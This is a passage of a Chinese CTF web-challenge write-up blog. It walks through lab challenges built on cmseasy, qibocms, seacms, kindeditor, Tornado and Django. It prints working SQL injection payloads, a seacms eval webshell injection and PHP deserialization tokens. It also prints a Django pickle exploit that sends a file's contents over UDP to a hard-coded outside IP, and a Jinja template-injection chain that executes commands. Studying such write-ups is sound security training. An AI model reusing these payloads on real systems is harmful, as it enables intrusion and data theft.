循环加密</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = $tmp;</span><br><span class="line">    <span class="comment">// 循环异或</span></span><br><span class="line">    <span class="keyword">for</span> ($n=<span class="number">0</span>;$n&lt;strlen($chars); $n++)&#123;</span><br><span class="line">        $keytest = $key . $chars[$n];</span><br><span class="line">        $ttmp = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">            $ttmp .= $txt[$i] ^ $keytest[$i];</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite($file, base64_encode($rnd.$ttmp).<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = findkey();</span><br><span class="line">encrypt($value[<span class="number">0</span>], $value[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1559639716673.png" alt="1559639716673"></p>
+<h2 id="YeserCMS"><a href="#YeserCMS" class="headerlink" title="YeserCMS"></a>YeserCMS</h2><p>进去先扫一下cms指纹</p>
+<p><img src="/images/1559736324794.png" alt="1559736324794"></p>
+<p>得知是cmseasy，先搜一波现成的洞，发现有一个sql注入</p>
+<p>注入原理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/parse_str()的作用是解析字符串并且把字符串注册成变量，第二个参数$arr是一个数组，parse_str()之前会先urldecode,也就是会二次url解码，实现单引号逃逸</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>/celive/live/header.php</p>
+</blockquote>
+<blockquote>
+<p>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><q>detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat%2528username%252C%2527%257C%2527%252Cpassword%2529%2529%2520from%2520user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520</q></xjxquery></p>
+</blockquote>
+<p>大概原理就是这样，但是这道题除了注入点一样之外和这个洞基本没关系，具体payload在下边，</p>
+<blockquote>
+<p>// 库名</p>
+<p>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><q>detail=xxxxxx’,(UpdateXML(1,CONCAT(0x5b,mid((SELECT database()),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)– </q></xjxquery></p>
+</blockquote>
+<p><img src="/images/1559740129223.png" alt="1559740129223"></p>
+<blockquote>
+<p>// 表名</p>
+<p>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><q>detail=xxxxxx’,(UpdateXML(1,CONCAT(0x5b,mid((SELECT GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)– </q></xjxquery></p>
+</blockquote>
+<p><img src="/images/1559740252651.png" alt="1559740252651"></p>
+<p>然而这里显示的不全了，可以改<code>,1,32),0x5d)</code>中1的值，接着往后读，最后得到有用的表名为<code>yesercms_user</code></p>
+<blockquote>
+<p>//列名</p>
+<p>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><q>detail=xxxxxx’,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(column_name) from information_schema.columns where table_name=’yesercms_user’),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)– </q></xjxquery></p>
+</blockquote>
+<p><img src="/images/1559740489843.png" alt="1559740489843"></p>
+<p>最后注账号密码就完事了</p>
+<blockquote>
+<p>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><q>detail=xxxxxx’,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,’|’,password)) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)– </q></xjxquery></p>
+</blockquote>
+<p><img src="/images/1559740608336.png" alt="1559740608336"></p>
+<p>这里也是不全的，按照上面的方法读全后md5去somd5解一下就可以</p>
+<p><img src="/images/1559740688798.png" alt="1559740688798"></p>
+<p>得到账号密码<code>admin|Yeser231</code>，登录后发现新世界，直接访问/admin就可以进入后台</p>
+<p>在这里卡了很久，一些后台getshell的方法也没打出来，就放弃了getshell，那么该怎么读取flag呢，发现在当前模板编辑那里，点击编辑会显示出文件内容</p>
+<p><img src="/images/1559741840336.png" alt="1559741840336"></p>
+<p>抓个包看一下</p>
+<p><img src="/images/1559741758915.png" alt="1559741758915"></p>
+<p>直接改看一看能不能读文件，发现可以读，然后尝试读flag，最后payload如下</p>
+<p><img src="/images/1559741967106.png" alt="1559741967106"></p>
+<h2 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h2><p>看这个url，根据下边的tornado推测这个可能是个python写的网站，为了证实这个推测，用burp抓个包改一下参数，可以看到报错信息</p>
+<p><img src="/images/1560826197206.png" alt="1560826197206"></p>
+<p>发现确实如此，rtiny很可疑，谷歌搜一下，发现在github上有一个项目，进去直接审源码</p>
+<p>在<code>index.py</code>里有一个<code>&quot;cookie_secret&quot;: &quot;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&quot;</code></p>
+<p>在<code>/rtiny/lock.py</code>里直接拼接了参数，存在sql注入</p>
+<p><img src="/images/1560827084203.png" alt="1560827084203"></p>
+<p>所以现在需要的就是在cookie的<code>username</code>字段中注入，而这里是secure_cookie，是密文传输的，我们需要自己根据上边的<code>cookie_secret</code>去生成，具体代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web </span><br><span class="line"></span><br><span class="line">settings = &#123; </span><br><span class="line">   <span class="string">"cookie_secret"</span> : <span class="string">"M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc="</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#self.set_secure_cookie("username", "' and updatexml(1,concat(0x3a,(select database()),0x3a),1);#") #xss</span></span><br><span class="line">        <span class="comment">#self.set_secure_cookie("username", "' and updatexml(1,concat(0x3a,mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),32,64),0x3a),1);#") #host,manager,module,msglog,project</span></span><br><span class="line">        <span class="comment">#self.set_secure_cookie("username", "' and updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name='manager'),0x3a),1);#") #username,password,email</span></span><br><span class="line">        <span class="comment">#self.set_secure_cookie("username", "' and updatexml(1,concat(0x3a,(select group_concat(username) from xss.manager),0x3a),1);#") #ichuqiu</span></span><br><span class="line">        <span class="comment">#self.set_secure_cookie("username", "' and updatexml(1,concat(0x3a,mid((select group_concat(password) from xss.manager),32,64),0x3a),1);#") #Myxss623</span></span><br><span class="line">        self.set_secure_cookie(<span class="string">"username"</span>, <span class="string">"' and updatexml(1,concat(0x3a,(select group_concat(email) from xss.manager),0x3a),1);#"</span>) <span class="comment"># 545</span></span><br><span class="line">        <span class="comment">#self.set_secure_cookie("username", "' and 1=2 union select extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),1,40)));#") #flag&#123;73602e42-4953-4e4e-a53d-9e7cb28c93ae&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_app</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">        (<span class="string">r"/index"</span>, MainHandler),</span><br><span class="line">        ], **settings)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(<span class="string">'1234'</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure>
+
+<p>然后带着生成的cookie去访问lock.py就可以报错注入了</p>
+<p><img src="/images/1560833750774.png" alt="1560833750774"></p>
+<p>最后得到账号<code>ichuqiu</code>，密码<code>Myxss623</code></p>
+<p>登录后发现flag文件</p>
+<p><img src="/images/1560834192048.png" alt="1560834192048"></p>
+<p>然后用刚才的方法报错注入读文件即可，注意一次只能读32位，所以要分两次读</p>
+<h2 id="再见CMS"><a href="#再见CMS" class="headerlink" title="再见CMS"></a>再见CMS</h2><p>先扫一下路径</p>
+<p><img src="/images/1560048636789.png" alt="1560048636789"></p>
+<p>发现有flag.php</p>
+<p>然后识别一下cms</p>
+<p><img src="/images/1560048872032.png" alt="1560048872032"></p>
+<p>之后就是找洞去打了，可以搜到一个在改用户信息的地方的sql注入漏洞，所以先注册个账号，然后打就完事了</p>
+<blockquote>
+<p>url:/member/userinfo.php?job=edit&amp;step=2</p>
+<p>POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select user()) where uid=3%23</p>
+</blockquote>
+<p>其中old_password是你的密码，email是注册的邮箱</p>
+<p>成功打到了user</p>
+<p><img src="/images/1560051445075.png" alt="1560051445075"></p>
+<p>然后可以去尝试读取刚才发现的flag.php</p>
+<blockquote>
+<p>address=(load_file(‘/var/www/html/flag.php’))</p>
+</blockquote>
+<p>然而这样会显示数据库连接出错，是因为引号被转义了，可以考虑转成16进制绕过</p>
+<blockquote>
+<p>address=(load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870))</p>
+</blockquote>
+<p>然后在个人信息处查看源码就可以得到flag</p>
+<p><img src="/images/1560051400725.png" alt="1560051400725"></p>
+<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>这题脑洞真的大，fuzz也没测出来，&lt;&gt;绕过我也是不知道为什么</p>
+<p>知道怎么绕过之后这题简直就是白给，直接打一发就完事了</p>
+<blockquote>
+<p>// 位置</p>
+<p>index.php?id=1 union sel&lt;&gt;ect 1,2,3</p>
+</blockquote>
+<blockquote>
+<p>// 表名</p>
+<p>index.php?id=1 union sel&lt;&gt;ect 1,(sel&lt;&gt;ect group_concat(table_name) from information_schema.tables where table_schema=database()),3</p>
+</blockquote>
+<blockquote>
+<p>// 列名</p>
+<p>index.php?id=1 union sel&lt;&gt;ect 1,(sel&lt;&gt;ect group_concat(column_name) from information_schema.columns where table_name=’info’),3</p>
+</blockquote>
+<blockquote>
+<p>//flag</p>
+<p>index.php?id=1 union se&lt;&gt;lect 1,(sel&lt;&gt;ect group_concat(flAg_T5ZNdrm) from info),3</p>
+</blockquote>
+<h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p>点进去会有个跳转，抓个包看一看，发现与一个隐藏的文件</p>
+<p><img src="/images/1560166612254.png" alt="1560166612254"></p>
+<p>访问一下，在头部有一个有趣的东西</p>
+<p><img src="/images/1560166667454.png" alt="1560166667454"></p>
+<p>进去看看，根据题目应该就是sql注入了</p>
+<p><img src="/images/1560166741773.png" alt="1560166741773"></p>
+<p>关键词fuzz测一波，发现逗号被过滤了，可以采取一下方法绕过</p>
+<blockquote>
+<p>union select * from (select 1) a join (select 2) b</p>
+</blockquote>
+<p>测试一下，成功绕过</p>
+<p><img src="/images/1560168023532.png" alt="1560168023532"></p>
+<p>剩下的就是常规sql注入了，最后得到flag的payload如下</p>
+<p><img src="/images/1560168192979.png" alt="1560168192979"></p>
+<h2 id="123"><a href="#123" class="headerlink" title="123"></a>123</h2><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>进去一看，seacms，直接搜洞就完事了，海洋cms 命令执行漏洞</p>
+<p>payload如下</p>
+<blockquote>
+<p>/search.php?searchtype=5&amp;tid=&amp;area=eval%28$_POST[cmd]%29</p>
+</blockquote>
+<p>直接蚁剑连接一下，找一找配置文件</p>
+<p><img src="/images/1560169554207.png" alt="1560169554207"></p>
+<p>然后连接数据库</p>
+<p><img src="/images/1560169618225.png" alt="1560169618225"></p>
+<p>发现flag就躺在里边</p>
+<p><img src="/images/1560169656962.png" alt="1560169656962"></p>
+<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>首先看一下源码，发现有点东西</p>
+<p><img src="/images/1560925275403.png" alt="1560925275403"></p>
+<p>然后尝试用test1登录，成功</p>
+<p><img src="/images/1560925401933.png" alt="1560925401933"></p>
+<p>show很显眼，抓包看一下，改完得到了源码</p>
+<p><img src="/images/1560925559214.png" alt="1560925559214"></p>
+<p>源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line">	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $where;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;where))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;select(<span class="keyword">$this</span>-&gt;where);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($where)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			$sql = mysql_query(<span class="string">'select * from user where '</span>.$where);</span><br><span class="line">			<span class="keyword">return</span> @mysql_fetch_array($sql);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">		$db = <span class="keyword">new</span> db();</span><br><span class="line">		$row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br><span class="line">		<span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		header(<span class="string">'Location: index.php?error=1'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>很简单的反序列化，payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = [<span class="string">'user'</span> =&gt; <span class="string">'ichunqiu'</span>];</span><br><span class="line">$b = base64_encode(gzcompress(serialize($a)));</span><br><span class="line">var_dump($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</span></span><br></pre></td></tr></table></figure>
+
+<p>带进去即可</p>
+<p><img src="/images/1560926053176.png" alt="1560926053176"></p>
+<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p><code>git</code>中与缓存相关的就是<code>stash</code>，我们进入下载下来的网站目录，再进入<code>.git</code>目录，再进入<code>refs</code>目录，之后<code>cat stash</code>：得到一个<code>commit</code></p>
+<p><img src="/images/1.png" alt="img"></p>
+<p>到刚才的目录下使用命令<code>git reset --hard bee231dcc3e136cf01d4b0a075765a9490ecfa87</code>，就恢复了flag文件</p>
+<p><img src="/images/2.png" alt="1557632999375"></p>
+<p>访问就可以了</p>
+<h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p>Django 泄露key导致反序列化命令执行</p>
+<p>利用脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.serializers <span class="keyword">import</span> PickleSerializer</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY=<span class="string">'oa4$kkk802=rfm@tl^e5yb3qvs_ea3r!m*&amp;j+#_+s-9=xcieci'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetShellWithPython</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line">        <span class="keyword">return</span> (subprocess.call,</span><br><span class="line">                ([<span class="string">'python'</span>,<span class="string">'-c'</span>,</span><br><span class="line">                  <span class="string">'import socket,os;'</span></span><br><span class="line">                  <span class="string">'c=os.popen("cat flag.txt").read().strip();'</span></span><br><span class="line">                  <span class="string">'s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);'</span></span><br><span class="line">                  <span class="string">'s.sendto(c,("144.202.82.213",8080));'</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = signing.dumps(</span><br><span class="line">    obj=GetShellWithPython(),</span><br><span class="line">    serializer=PickleSerializer,</span><br><span class="line">    salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> sess</span><br></pre></td></tr></table></figure>
+
+<p>此处是建立UDP连接，python TCP和UDP连接的socket代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TCP</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#UDP</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br></pre></td></tr></table></figure>
+
+<p>解释</p>
+<table>
+<thead>
+<tr>
+<th>socket 类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>socket.AF_UNIX</td>
+<td>本机通信</td>
+</tr>
+<tr>
+<td>socket.AF_INET</td>
+<td>服务器间通信</td>
+</tr>
+<tr>
+<td>socket.AF_INET6</td>
+<td>IPV6进行服务器间通信</td>
+</tr>
+<tr>
+<td>socket.SOCK_STREAM</td>
+<td>基于TCP的流式通信</td>
+</tr>
+<tr>
+<td>socket.SOCK_DGRAM</td>
+<td>基于UDP的数据报式通信</td>
+</tr>
+<tr>
+<td>socket.SOCK_RAW</td>
+<td>原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以</td>
+</tr>
+<tr>
+<td>socket.SOCK_SEQPACKET</td>
+<td>可靠的连续数据包服务</td>
+</tr>
+</tbody></table>
+<p>常用socket函数</p>
+<table>
+<thead>
+<tr>
+<th>socket 函数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>s.recv(bufsize[, flag])</td>
+<td align="left">接受TCP套接字的数据，数据以字符串形式返回，bufsize指定要接受的最大数据量</td>
+</tr>
+<tr>
+<td>s.send(string[, flag])</td>
+<td align="left">发送TCP数据，将字符串中的数据发送到链接的套接字</td>
+</tr>
+<tr>
+<td>s.sendall(string[, flag])</td>
+<td align="left">完整发送TCP数据，将字符串中的数据发送到链接的套接字</td>
+</tr>
+<tr>
+<td>s.recvfrom(bufsize[, flag])</td>
+<td align="left">接受UDP套接字的数据u，与recv()类似，但返回值是tuple(data, address)</td>
+</tr>
+<tr>
+<td>s.sendto(string[, flag], address)</td>
+<td align="left">发送UDP数据，将数据发送到套接字，address形式为tuple(ipaddr, port)</td>
+</tr>
+<tr>
+<td>s.close()</td>
+<td align="left">关闭套接字</td>
+</tr>
+</tbody></table>
+<p>最终flag为</p>
+<p><img src="/images/1557804173167.png" alt="1557804173167"></p>
+<h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><p>尝试发现sql注入</p>
+<p>有user和token两个表，token表是空的</p>
+<p>user表里有三列username,password,level</p>
+<p>username 里有member,guest</p>
+<p>password里是$6$rounds=66$nHxhhCl/k9nL5Df47FWdXFZIjRgzV2gXmVdHybywlQ3RIQ/2FvUM/L1y3mgnUBRvJNw9I0Qc5uRbc6EUwxB87/</p>
+<p>payload为<code>level.php?name=%27union%20select%20token%20from%20token%20%23</code></p>
+<p>未完</p>
+<h2 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h2><p>进去一片空白，抓个包看一下，有一个hint，<code>hint: ip,Large internal network</code></p>
+<p>谷歌搜一哈，内部私有地址，A类是10.0.0.0，所以加一个<code>client-ip: 10.0.0.1</code>即可，这里每一个请求都要带上这个，很烦</p>
+<p>发现跳转到<code>/m4nage.php</code>，有一个show me your key</p>
+<p>POST请求发一哈，然后返回了一个md5，搜一下，解出来<code>ichunqiu105</code>，提交过去返回下一关，看源码给了个解密函数，本地php直接跑就行了</p>
+<p>虽然题目叫fuzzing，但是感觉并没有什么fuzzing的点，很没意思</p>
+<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><p>先用burpsuite的server-side variable name字典跑一下参数，得到name</p>
+<p>随便输点什么，发现会直接回显出来</p>
+<p>尝试python的模板注入payload有反应</p>
+<p><img src="/images/1557988009867.png" alt="1557988009867"></p>
+<p>直接掏出祖传payload测一下</p>
+<p>利用思路：利用file类向tmp目录下写入py文件，然后再对其编译，加载到config变量中，check_output是python带的一个可以命令执行的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;,&apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.from_pyfile(&apos;/tmp/owned.cfg&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config[&apos;RUNCMD&apos;](&apos;/usr/bin/id&apos;,shell =True)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p><img src="/images/1557988486057.png" alt="1557988486057"></p>
+<p>发现没有过滤<code>find</code>命令，直接找flag</p>
+<p><code>find /var/www/</code></p>
+<p><img src="/images/1557988581982.png" alt="1557988581982"></p>
+<p>在读文件的时候遇到了问题，发现<code>fl4g</code>被直接过滤了，但是可以通过编码绕过，先将读取的python代码写到tmp目录下再执行即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> open(<span class="string">'/var/www/html/fl4g'</span>,<span class="string">'r'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config[&apos;RUNCMD&apos;](&apos;echo cHJpbnQgb3BlbignL3Zhci93d3cvaHRtbC9mbDRnJywncicpLnJlYWQoKQ==|base64 -d&gt;/tmp/get.py&apos;,shell=True)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config[&apos;RUNCMD&apos;](&apos;python /tmp/get.py&apos;,shell=True)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1557988948649.png" alt="1557988948649"></p>
+<h2 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h2><p>首先注册一个账号，进去发现有写文章的地方，尝试上传文件，发现返回了一个错误</p>
+<p><img src="/images/1558313699881.png" alt="1558313699881"></p>
+<p>我们可以知道使用了kindeditor，搜一下这个东西的漏洞</p>
+<p>发现存在文件上传和路径遍历漏洞，首先排除文件上传，因为这里上传直接404了，试一下路径遍历的payload</p>
+<blockquote>
+<p>kindeditor/php/file_manager_json.php?path=../../../../../var/www/html/</p>
+</blockquote>
+<p>发现爆出了路径</p>
+<p><img src="/images/1558314294910.png" alt="1558314294910"></p>
+<p><img src="/images/1558316943952.png" alt="1558316943952"></p>
+<p>这个漏洞的利用目前已经结束了，换个方向</p>
+<p>blog有写文章的功能，推测是将文章插入数据库中，插入语句应该类似</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table(&apos;A&apos;,&apos;B&apos;,&apos;C&apos;) values(&apos;A&apos;,&apos;B&apos;,&apos;C&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>尝试闭合一下</p>
+<p><img src="/images/1558315951433.png" alt="1558315951433"></p>
+<p>发现成功闭合</p>
+<p>而insert是可以插入两条语句的，所以我们可以在闭合了前一条后接着插入第二条数据，经过尝试，发现确实可以</p>
+<p><img src="/images/1558316015415.png" alt="1558316015415"></p>
+<p>所以开始sql注入，也没发现什么过滤，具体操作看之前的sql注入命令备忘，这里直接得到了结果</p>
+<p><img src="/images/1558316437041.png" alt="1558316437041"></p>
+<p>解出管理员的密码，<code>melody123</code> </p>
+<p>登陆后发现新的功能，管理文章</p>
+<blockquote>
+<p>blog_manage/manager.php?module=article_manage&amp;name=php</p>
+</blockquote>
+<p>这个module很熟悉，刚才在读文件的时候，发现有<code>aritcle_manage.php</code> 推测文件包含，试一下payload</p>
+<blockquote>
+<p>php://filter/read=convert.base64-encode/resource=../flag</p>
+</blockquote>
+<p>发现成功回显，base64解一下就得到了flag</p>
+<p><img src="/images/1558317088591.png" alt="1558317088591"></p>
